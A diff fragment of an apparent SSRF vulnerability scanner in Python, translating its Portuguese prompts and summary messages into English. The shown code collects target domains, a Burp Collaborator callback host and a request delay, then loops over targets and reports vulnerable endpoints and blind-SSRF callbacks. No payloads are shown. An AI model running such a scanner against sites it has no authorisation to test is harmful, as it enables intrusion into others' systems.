-        print(f"{GREEN}[RESUMO - {target}]{RESET}")
-        print(f"  • Total de evidências: {len(arsenal.all_evidence)}")
-        print(f"  • Endpoints descobertos: {len(arsenal.discovered_endpoints)}")
-        print(f"  • Endpoints vulneráveis: {len(arsenal.vulnerable_endpoints)}")
+        print(f"{GREEN}[SUMMARY - {target}]{RESET}")
+        print(f"  • Total evidence: {len(arsenal.all_evidence)}")
+        print(f"  • Endpoints discovered: {len(arsenal.discovered_endpoints)}")
+        print(f"  • Vulnerable endpoints: {len(arsenal.vulnerable_endpoints)}")
         sev_count = {}
         for e in arsenal.all_evidence:
             sev_count[e.severity] = sev_count.get(e.severity, 0) + 1
@@ -757,8 +958,8 @@ async def scan_single_target(target: str, callback_host: str, delay: float):
             if sev in sev_count:
                 print(f"    {sev.upper()}: {sev_count[sev]}")
         if arsenal.blind_callbacks:
-            print(f"  {RED}{BOLD}  • BLIND SSRF CONFIRMADO! Callbacks recebidos: {len(arsenal.blind_callbacks)}{RESET}")
-        print(f"  • Resultados salvos em: {BOLD}{arsenal.results_file}{RESET}")
+            print(f"  {RED}{BOLD}  • BLIND SSRF CONFIRMED! Callbacks received: {len(arsenal.blind_callbacks)}{RESET}")
+        print(f"  • Results saved to: {BOLD}{arsenal.results_file}{RESET}")
     finally:
         await arsenal.__aexit__()
     return arsenal
@@ -773,54 +974,58 @@ def read_targets_from_file(filename: str) -> List[str]:
                 if line and not line.startswith('#'):
                     targets.append(line)
     except Exception as e:
-        print(f"{FAIL} Erro ao ler arquivo {filename}: {e}")
+        print(f"{FAIL} Error reading file {filename}: {e}")
     return targets
 
 
 async def main():
     print(BANNER)
-    print(f"{WARN} Como deseja fornecer os alvos?")
-    print("  1 - Domínio único")
-    print("  2 - Lista separada por vírgulas (ex: exemplo.com,teste.com,site.org)")
-    print("  3 - Arquivo com um domínio por linha")
-    choice = input(f"{WARN} Escolha [1/2/3]: ").strip()
+    print(f"{WARN} How would you like to provide targets?")
+    print("  1 - Single domain")
+    print("  2 - Comma-separated list (e.g., example.com,test.com,site.org)")
+    print("  3 - File with one domain per line")
+    choice = input(f"{WARN} Choose [1/2/3]: ").strip()
     targets = []
     if choice == "1":
-        target = input(f"{WARN} Digite o target (ex: exemplo.com): ").strip()
+        target = input(f"{WARN} Enter target (e.g., example.com): ").strip()
         if not target:
-            print(f"{FAIL} Target não pode ser vazio")
+            print(f"{FAIL} Target cannot be empty")
             return
         targets = [target]
     elif choice == "2":
-        target_list = input(f"{WARN} Digite os domínios separados por vírgula: ").strip()
+        target_list = input(f"{WARN} Enter domains separated by commas: ").strip()
         if not target_list:
-            print(f"{FAIL} Lista vazia")
+            print(f"{FAIL} Empty list")
             return
         targets = [t.strip() for t in target_list.split(',') if t.strip()]
     elif choice == "3":
-        filename = input(f"{WARN} Caminho do arquivo: ").strip()
+        filename = input(f"{WARN} File path: ").strip()
         if not filename:
-            print(f"{FAIL} Arquivo não informado")
+            print(f"{FAIL} File not provided")
             return
         targets = read_targets_from_file(filename)
         if not targets:
-            print(f"{FAIL} Nenhum alvo encontrado no arquivo")
+            print(f"{FAIL} No targets found in file")
             return
     else:
-        print(f"{FAIL} Opção inválida")
+        print(f"{FAIL} Invalid option")
         return
-    callback = input(f"{WARN} Digite seu callback host (Burp Collaborator / webhook) [opcional]: ").strip()
+
+    callback = input(f"{WARN} Enter your callback host (Burp Collaborator / webhook) [optional]: ").strip()
     if not callback:
         callback = "YOUR.BURP.COLLABORATOR.NET"
-        print(f"{WARN} Usando default (sem detecção blind): {callback}")
-    delay_input = input(f"{WARN} Delay entre requisições (segundos) [padrão 0.5]: ").strip()
+        print(f"{WARN} Using default (no blind detection): {callback}")
+
+    delay_input = input(f"{WARN} Delay between requests (seconds) [default 0.5]: ").strip()
     delay = float(delay_input) if delay_input else 0.5
-    print(f"\n{BOLD}{GREEN}Iniciando scan para {len(targets)} alvo(s)...{RESET}\n")
+
+    print(f"\n{BOLD}{GREEN}Starting scan for {len(targets)} target(s)...{RESET}\n")
+
     all_results = []
     total_critical = 0
     total_high = 0
     for i, target in enumerate(targets, 1):
-        print(f"\n{BOLD}{YELLOW}[{i}/{len(targets)}] Processando: {target}{RESET}")
+        print(f"\n{BOLD}{YELLOW}[{i}/{len(targets)}] Processing: {target}{RESET}")
         arsenal = await scan_single_target(target, callback, delay)
         for evidence in arsenal.all_evidence:
             if evidence.severity == "critical":
@@ -836,20 +1041,21 @@ async def main():
             "results_file": arsenal.results_file
         })
         if i < len(targets):
-            print(f"\n{DIM}Aguardando 5 segundos antes do próximo target...{RESET}")
+            print(f"\n{DIM}Waiting 5 seconds before next target...{RESET}")
             await asyncio.sleep(5)
+
     print(f"\n{BOLD}{'='*60}{RESET}")
-    print(f"{BOLD}{GREEN}RESUMO CONSOLIDADO - {len(targets)} ALVO(S){RESET}")
+    print(f"{BOLD}{GREEN}CONSOLIDATED SUMMARY - {len(targets)} TARGET(S){RESET}")
     print(f"{BOLD}{'='*60}{RESET}")
     for res in all_results:
         print(f"\n  {BOLD}{res['target']}{RESET}")
-        print(f"    • Evidências: {res['findings_count']}")
-        print(f"    • Endpoints vulneráveis: {res['vulnerable_endpoints']}")
-        print(f"    • Críticas: {res['critical_findings']} | Altas: {res['high_findings']}")
-        print(f"    • Arquivo: {res['results_file']}")
+        print(f"    • Evidence: {res['findings_count']}")
+        print(f"    • Vulnerable endpoints: {res['vulnerable_endpoints']}")
+        print(f"    • Critical: {res['critical_findings']} | High: {res['high_findings']}")
+        print(f"    • File: {res['results_file']}")
     print(f"\n{BOLD}{'='*60}{RESET}")
-    print(f"{BOLD}Total de achados críticos em todos os alvos: {total_critical}{RESET}")
-    print(f"{BOLD}Total de achados de alta severidade: {total_high}{RESET}")
+    print(f"{BOLD}Total critical findings across all targets: {total_critical}{RESET}")
+    print(f"{BOLD}Total high severity findings: {total_high}{RESET}")
     print(f"{BOLD}{'='*60}{RESET}")
 
 
